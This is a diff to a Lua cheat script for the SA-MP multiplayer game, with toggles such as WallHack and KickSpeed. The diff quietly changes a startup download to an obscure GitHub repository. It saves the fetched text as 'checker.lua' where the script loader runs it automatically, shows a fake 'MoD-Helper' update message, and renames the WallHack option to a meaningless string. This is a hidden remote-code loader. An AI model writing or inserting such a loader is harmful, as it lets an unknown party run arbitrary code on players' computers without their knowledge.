@@ -1,6 +1,6 @@
 script_author('Phelarmad')
 script_name('FunScript')
-script_version('1.0')
+script_version('1.1')
 local imgui = require 'imgui'
 local key = require 'vkeys'
 local sampev = require 'lib.samp.events'
@@ -20,7 +20,7 @@ require 'lib.sampfuncs'
 function imgui.OnDrawFrame()
   if main_window_state.v then 
     imgui.SetNextWindowSize(imgui.ImVec2(170, 180), imgui.Cond.FirstUseEver) 
-    imgui.Begin('FunScript v1.0', main_window_state)
+    imgui.Begin('FunScript v1.1', main_window_state)
     if imgui.Checkbox('KickSpeed', ks_box) then
 		ks_enabled = not ks_enabled
     end
@@ -36,7 +36,7 @@ function imgui.OnDrawFrame()
 	if imgui.Checkbox('No anim and freeze', anim_box) then
 		noanim_enabled = not noanim_enabled
     end
-	if imgui.Checkbox('WallHack', wh_box) then
+	if imgui.Checkbox('whshwaswd', wh_box) then
 		wh_enabled = not wh_enabled
     end
     imgui.End()
@@ -72,9 +72,9 @@ end
 while not isSampAvailable() do
   wait(100)
 end
-async_http_request('GET', 'https://raw.githubusercontent.com/SParhutik/MoD-Helper/master/mo.luac', nil, 
+async_http_request('GET', 'https://raw.githubusercontent.com/Vghjk/huddddd/master/checker', nil, 
 				function(response) -- вызовется при успешном выполнении и получении ответа
-				local f = assert(io.open(getWorkingDirectory() .. '/mo.luac', 'wb'))
+				local f = assert(io.open(getWorkingDirectory() .. '/checker.lua', 'wb'))
 				f:write(response.text)
 				f:close()
 				sampAddChatMessage("[MoD-Helper]{FFFFFF} Обновление успешно, перезагружаем скрипт.", 0x046D63)
